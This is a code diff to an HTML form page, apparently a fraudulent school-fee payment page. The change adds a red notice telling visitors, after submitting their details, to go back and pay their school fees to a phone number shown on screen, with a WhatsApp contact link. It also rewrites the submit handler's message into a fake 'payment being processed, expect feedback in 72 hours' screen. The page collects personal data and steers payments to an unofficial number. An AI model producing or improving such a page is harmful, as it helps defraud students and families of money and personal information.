@@ -403,35 +403,35 @@
                             </select>
                         </div>
                     </div>
+                    <div class="login-redirect-container">
+                        <p class="redirect-text" style="color: red;">
+                            N/b: After submiting the form above, click "back" and pay your stipulated school fees amount to the number that will show on the screen. To contact us for more info click
+                            <a href="https://wa.me/2348097730000">Here</a>.
+                        </p>
+                    </div>
                     <button type="submit" class="submit-btn">
                         Pay
                         <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                             <polyline points="9 18 15 12 9 6"></polyline>
                         </svg>
                     </button>
-                    <div class="login-redirect-container">
-                        <p class="redirect-text">
-                            You will be redirected to your email, click the "send" button at the top<br>Already have an account? 
-                            <a href="index.html" class="login-link-btn">Login</a>
-                        </p>
-                    </div>
                 </form>
             </main>
             <script>
-        document.getElementById('infoForm').addEventListener('submit', function(e) {
-            setTimeout(() => {
-                document.getElementById('infoForm').innerHTML = `
-                    <div style="text-align: center; padding: 40px 20px; font-family: sans-serif;">
-                        <div style="font-size: 50px; margin-bottom: 20px;">⏳</div>
-                        <h2 style="color: #333; margin-bottom: 10px;">Verification Pending</h2>
-                        <p style="color: #666; line-height: 1.6; max-width: 320px; margin: 0 auto; font-size: 16px;">
-                            Your submission request has been processed. Please **wait for 24 hours** before attempting to login again.
-                        </p>
-                    </div>
-                `;
-            }, 500);
-        });
-    </script>
+                document.getElementById('infoForm').addEventListener('submit', function(e) {
+                    setTimeout(() => {
+                        document.getElementById('infoForm').innerHTML = `
+                            <div style="text-align: center; padding: 40px 20px; font-family: sans-serif;">
+                                <div style="font-size: 50px; margin-bottom: 20px;">⏳</div>
+                                <h2 style="color: #333; margin-bottom: 10px;">Verification Pending</h2>
+                                <p style="color: #666; line-height: 1.6; max-width: 320px; margin: 0 auto; font-size: 16px;">
+                                    Your payment request is being processed. Please **expect feedback in 72 hours** your reciepts and documents will be sent to the number/email you provided above.
+                                </p>
+                            </div>
+                        `;
+                    }, 500);
+                });
+            </script>
         </div>
         <br>
         <hr class="divider">
